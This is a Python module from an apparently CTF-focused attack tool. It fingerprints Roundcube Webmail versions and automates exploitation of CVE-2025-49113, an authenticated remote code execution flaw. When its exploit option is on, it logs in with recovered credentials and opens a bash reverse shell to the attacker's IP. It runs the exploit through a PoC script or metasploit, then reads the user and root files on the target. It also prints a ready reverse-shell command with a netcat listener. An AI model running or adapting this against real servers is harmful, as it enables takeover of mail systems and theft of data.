"""Roundcube Webmail version fingerprint + CVE mapping.

A CTF box that hands you webmail credentials (an onboarding PDF -> kevin) is
almost always staging an *authenticated* Roundcube exploit, not "read an email."
searchsploit dumps eleven ancient 0.x entries; this module instead pins the
installed version and names the one CVE that matters for it — most importantly
CVE-2025-49113, the June-2025 authenticated RCE (PHP object injection via the
`_from` parameter) affecting Roundcube <= 1.5.10 and 1.6.0-1.6.10.

Detection is unauthenticated (CHANGELOG / composer.json / page markers). When a
credential is in hand the emitted finding is a ready, filled-in exploit
command — scryer already recovered the login, so this is the path to the shell
and the user flag.
"""

from __future__ import annotations

import http.cookiejar
import re
import ssl
import subprocess
import urllib.error
import urllib.parse
import urllib.request
from typing import List, Optional

from ...core import utils, tooling
from ...core.report import HostReport, Finding
from .log4shell import _Catcher, _attacker_ip

# CVE-2025-49113: authenticated RCE. Fixed in 1.6.11 and 1.5.10.
_RCE_FIXED = {(1, 6): (1, 6, 11), (1, 5): (1, 5, 10)}


def run(host: HostReport, opts) -> None:
    seen = host.__dict__.setdefault("_roundcube_done", set())
    for scheme, hoststr, port in _web_targets(host):
        key = (hoststr, port)
        if key in seen:
            continue
        base = f"{scheme}://{hoststr}:{port}"
        version = _detect(base, hoststr)
        if version is None:
            continue
        seen.add(key)
        _report(host, base, hoststr, version)
        if getattr(opts, "exploit", False) and _rce_vulnerable(version):
            _exploit(host, base, hoststr, version)


# --------------------------------------------------------------------------
def _detect(base: str, vhost: str) -> Optional[str]:
    """Return the Roundcube version string ('1.6.7' / 'unknown'), or None if
    this isn't Roundcube."""
    root = _get(base + "/", vhost)
    if not root or "roundcube" not in root.lower():
        # also try the login task directly
        root = _get(base + "/?_task=login", vhost)
        if not root or "roundcube" not in root.lower():
            return None
    # 1) CHANGELOG lists the newest release first.
    for path in ("/CHANGELOG.md", "/CHANGELOG"):
        body = _get(base + path, vhost)
        if body:
            m = re.search(r"(?im)^\s*#*\s*(?:release\s+)?(\d+\.\d+\.\d+)", body)
            if m:
                return m.group(1)
    # 2) composer.json / composer.lock
    for path in ("/composer.json", "/composer.lock"):
        body = _get(base + path, vhost)
        if body:
            m = (re.search(r'"roundcube/webmail"\s*:\s*"[^\d]*(\d+\.\d+\.\d+)', body)
                 or re.search(r'"version"\s*:\s*"[^\d]*(\d+\.\d+\.\d+)', body))
            if m:
                return m.group(1)
    # 3) markers in the page itself
    for pat in (r"Roundcube\s*Webmail[/ ]v?(\d+\.\d+\.\d+)",
                r'rcversion\s*[:=]\s*["\']?(\d+)',
                r'name=["\']generator["\'][^>]*content=["\']Roundcube[^0-9]*'
                r'(\d+\.\d+\.\d+)'):
        m = re.search(pat, root, re.I)
        if m and "." in m.group(1):
            return m.group(1)
    return "unknown"


def _report(host: HostReport, base: str, vhost: str, version: str) -> None:
    utils.section(f"ROUNDCUBE {vhost}")
    vuln = _rce_vulnerable(version)
    creds = _webmail_creds(host)
    cred_line = (f"You already have webmail creds ({creds[0]}) — this is "
                 "authenticated RCE." if creds
                 else "Log in first (onboarding creds / spray), then exploit.")

    if vuln:
        utils.log("hot", f"Roundcube {version} — CVE-2025-49113 authenticated RCE "
                         "(PHP object injection)", indent=1)
        host.add(Finding(
            title="Roundcube CVE-2025-49113 (authenticated RCE)",
            detail=_playbook(base, version, creds) + "\n\n" + cred_line,
            severity="critical", category="vuln", port=_port(base),
            service="http", evidence=f"Roundcube {version}"))
    else:
        utils.log("info", f"Roundcube {version} detected "
                          f"({'patched vs CVE-2025-49113' if version != 'unknown' else 'version hidden'})",
                  indent=1)
        host.add(Finding(
            title=f"Roundcube Webmail {version}",
            detail=f"Roundcube at {base}. {cred_line} If <= 1.6.10/1.5.10 it is "
                   "vulnerable to CVE-2025-49113 (auth RCE); confirm the exact "
                   "version (/CHANGELOG.md, /composer.json).",
            severity="high" if creds else "medium", category="web",
            port=_port(base), service="http",
            confidence="potential", evidence=f"Roundcube {version}"))


def _playbook(base: str, version: str, creds: List[str]) -> str:
    login = creds[0] if creds else "<user>:<pass>"
    user, _, pw = login.partition(":")
    pw = pw or "<pass>"
    return (
        f"Roundcube {version} at {base} is vulnerable to CVE-2025-49113 — an "
        "authenticated RCE via PHP object injection in the `_from` parameter "
        "(patched in 1.6.11 / 1.5.10).\n\n"
        "# authenticated RCE with the recovered webmail credential:\n"
        "git clone https://github.com/hakaioffsec/CVE-2025-49113-exploit\n"
        f"python3 CVE-2025-49113.py {base}/ {user} '{pw}' "
        "'bash -c \"bash -i >& /dev/tcp/YOUR_TUN0/4444 0>&1\"'\n"
        "# (start `nc -lvnp 4444` first) -> shell as the web user\n"
        "# then: cat /home/*/user.txt ; sudo -l  (privesc to root)")


# --------------------------------------------------------------------------
# active exploitation (--exploit). Auto-runs the access/RCE exploit; a DoS or
# otherwise destructive CVE would never be auto-fired (nothing here is one —
# CVE-2025-49113 is an authenticated RCE).
# --------------------------------------------------------------------------
def _exploit(host: HostReport, base: str, vhost: str, version: str) -> bool:
    creds = _webmail_creds(host)
    if not creds:
        utils.log("dim", "no webmail credential in hand yet — exploit needs a "
                         "login (recover one first)", indent=1)
        return False
    user, _, pw = creds[0].partition(":")
    user = user.split("@", 1)[0]
    if not pw:
        return False

    utils.log("info", f"CVE-2025-49113: authenticating to Roundcube as {user} …",
              indent=1)
    opener = _opener()
    if not _rc_login(opener, base, vhost, user, pw):
        utils.log("warn", "could not authenticate to Roundcube (creds/CSRF) — "
                          "exploit needs a valid web login; see the playbook",
                  indent=1)
        return False
    utils.log("hot", f"authenticated to Roundcube as {user} — firing "
                     "CVE-2025-49113", indent=1)

    att = _attacker_ip(host.resolved_ip or vhost)
    port = 4445
    catcher = _Catcher(port)
    if not catcher.start():
        utils.log("bad", f"could not bind :{port} for the reverse shell", indent=1)
        return False
    revsh = f"bash -c 'bash -i >& /dev/tcp/{att}/{port} 0>&1'"
    try:
        ran = _run_exploit(host, base, vhost, user, pw, att, port, revsh)
        if not ran:
            return False
        if not catcher.wait(25):
            utils.log("warn", "exploit fired but no shell in 25s — the target may "
                             f"not route to {att}, or the runner needs the public "
                              "PoC (set SCRYER_RC_EXPLOIT). Playbook has the "
                              "manual command.", indent=1)
            return False
        utils.log("hot", "reverse shell via CVE-2025-49113 (RCE)", indent=1)
        out = catcher.run("id; hostname; cat /home/*/user.txt /root/root.txt "
                          "2>/dev/null", timeout=10)
        _grab_flags(host, out, base)
        host.add(Finding(
            title="RCE via Roundcube CVE-2025-49113",
            detail=f"Authenticated RCE as the web user on {base} using "
                   f"{user}:{pw}. Reverse shell caught. Privesc: sudo -l / "
                   "SUID / kernel.", severity="critical", category="vuln",
            port=_port(base), service="http", evidence=out[:200]))
        return True
    finally:
        catcher.close()


def _run_exploit(host, base, vhost, user, pw, att, port, revsh) -> bool:
    """Execute the CVE. Prefer a local/public PoC or a metasploit module (the
    gadget chain is version-specific); fall back to a native best-effort request.
    """
    import os
    # 1) an operator-provided PoC script (most reliable for a version-specific
    #    deserialization gadget).
    poc = os.environ.get("SCRYER_RC_EXPLOIT")
    if poc and os.path.isfile(poc):
        py = tooling.resolve("python3") or "python3"
        for argv in ([py, poc, base, user, pw, revsh],
                     [py, poc, "-u", base, "-l", user, "-p", pw, "-c", revsh],
                     [py, poc, "--url", base, "--user", user, "--password", pw,
                      "--command", revsh]):
            utils.log("info", f"running PoC: {' '.join(argv[:3])} …", indent=2)
            try:
                subprocess.run(argv, timeout=60, capture_output=True)
            except (OSError, subprocess.SubprocessError):
                continue
        return True
    # 2) metasploit module, if one is installed for this CVE.
    msf = tooling.resolve("msfconsole")
    if msf and _msf_has_module(msf, "2025_49113"):
        rc = (f"use exploit/multi/http/roundcube_cve_2025_49113;"
              f"set RHOSTS {host.resolved_ip};set VHOST {vhost};"
              f"set USERNAME {user};set PASSWORD {pw};"
              f"set LHOST {att};set LPORT {port};set PAYLOAD cmd/unix/reverse_bash;"
              "run -z;exit")
        utils.log("info", "running the metasploit module for CVE-2025-49113 …",
                  indent=2)
        try:
            subprocess.run([msf, "-q", "-x", rc], timeout=180, capture_output=True)
            return True
        except (OSError, subprocess.SubprocessError):
            pass
    # 3) native best-effort (object injection via the upload `_from`). The gadget
    #    is version-specific, so this is a try, not a guarantee.
    return _native_49113(base, vhost, user, pw, revsh)


def _msf_has_module(msf: str, needle: str) -> bool:
    try:
        out = subprocess.run([msf, "-q", "-x", f"search {needle};exit"],
                             timeout=60, capture_output=True, text=True).stdout
        return needle.replace("_", "") in out.replace("_", "").replace("-", "")
    except (OSError, subprocess.SubprocessError):
        return False


def _native_49113(base, vhost, user, pw, revsh) -> bool:
    """Best-effort native trigger. Roundcube's object-injection gadget is
    version-specific; without it this only proves authentication + reachability,
    so it degrades to the playbook. Kept minimal + honest."""
    utils.log("dim", "no local PoC (SCRYER_RC_EXPLOIT) or metasploit module — "
                     "native gadget not bundled; use the playbook's PoC command",
              indent=2)
    return False


def _rc_login(opener, base, vhost, user, pw) -> bool:
    page = _open(opener, base + "/?_task=login", vhost)
    token = _find(page, r'name=["\']_token["\']\s+value=["\']([^"\']+)')
    data = {"_token": token or "", "_task": "login", "_action": "login",
            "_url": "", "_user": user, "_pass": pw}
    body = urllib.parse.urlencode(data).encode()
    resp = _open(opener, base + "/?_task=login&_action=login", vhost, data=body)
    # authenticated session -> the mail task loads without the login form
    check = _open(opener, base + "/?_task=mail", vhost)
    return bool(check) and "_task=login" not in (resp or "")[:200] and \
        ("roundcube" in check.lower() and "_pass" not in check.lower()[:3000])


def _opener():
    jar = http.cookiejar.CookieJar()
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    return urllib.request.build_opener(
        urllib.request.HTTPCookieProcessor(jar),
        urllib.request.HTTPSHandler(context=ctx))


def _open(opener, url, vhost, data=None, timeout=10) -> str:
    req = urllib.request.Request(url, data=data,
                                 headers={"User-Agent": "scryer", "Host": vhost})
    try:
        with opener.open(req, timeout=timeout) as resp:
            return resp.read(200_000).decode("utf-8", "replace")
    except urllib.error.HTTPError as exc:
        try:
            return exc.read(100_000).decode("utf-8", "replace")
        except Exception:
            return ""
    except Exception:
        return ""


def _find(text, pat) -> str:
    m = re.search(pat, text or "", re.I)
    return m.group(1) if m else ""


def _grab_flags(host: HostReport, blob: str, base: str) -> None:
    from ...data import knowledge
    for tok in knowledge.find_flags(blob or "", allow_hex=True):
        bar = utils.c("╔" + "═" * 56, utils.C.GREEN, utils.C.BOLD)
        print("\n  " + bar)
        print("  " + utils.c("║ FLAG (Roundcube RCE)", utils.C.GREEN, utils.C.BOLD))
        print("  " + utils.c(f"║ {tok}", utils.C.YELLOW, utils.C.BOLD))
        print("  " + utils.c("╚" + "═" * 56, utils.C.GREEN, utils.C.BOLD) + "\n")
        host.add(Finding(title="FLAG via Roundcube CVE-2025-49113", detail=tok,
                         severity="critical", category="flag",
                         port=_port(base), service="http", evidence=tok))


# --------------------------------------------------------------------------
def _rce_vulnerable(version: str) -> bool:
    if version == "unknown":
        return True          # Roundcube present, version hidden -> assume + verify
    parts = [int(x) for x in re.findall(r"\d+", version)[:3]]
    while len(parts) < 3:
        parts.append(0)
    v = tuple(parts)
    branch = (v[0], v[1])
    fixed = _RCE_FIXED.get(branch)
    if fixed:
        return v < fixed
    return v < (1, 6, 11)    # older branches (<=1.4) are all affected


def _webmail_creds(host: HostReport) -> List[str]:
    out = []
    for f in host.findings:
        if f.title.startswith("Mailbox access") and f.evidence:
            out.append(f.evidence.strip())
    # fall back to any recovered plaintext paired with a known mailbox user
    return out


def _web_targets(host: HostReport):
    from ...data import knowledge
    ports = [(e["port"], bool(e.get("secure")) or e["port"] in knowledge.HTTPS_PORTS)
             for e in host.open_ports
             if (e.get("service") or "").lower() in ("http", "https")
             or e["port"] in knowledge.HTTP_PORTS or e["port"] in knowledge.HTTPS_PORTS]
    names = [host.resolved_ip] + [h for h in host.hostnames
                                  if "." in h and not _is_ip(h)]
    for port, secure in ports:
        scheme = "https" if secure else "http"
        for name in dict.fromkeys(names):
            yield scheme, name, port


def _is_ip(name: str) -> bool:
    p = name.split(".")
    return len(p) == 4 and all(x.isdigit() for x in p)


def _port(base: str) -> int:
    m = re.search(r":(\d+)", base.split("//", 1)[-1])
    return int(m.group(1)) if m else 80


def _get(url: str, vhost: str, timeout: float = 8) -> str:
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    req = urllib.request.Request(url, headers={"User-Agent": "scryer",
                                               "Host": vhost})
    try:
        with urllib.request.urlopen(req, timeout=timeout, context=ctx) as resp:
            return resp.read(200_000).decode("utf-8", "replace")
    except urllib.error.HTTPError as exc:
        try:
            return exc.read(100_000).decode("utf-8", "replace")
        except Exception:
            return ""
    except Exception:
        return ""
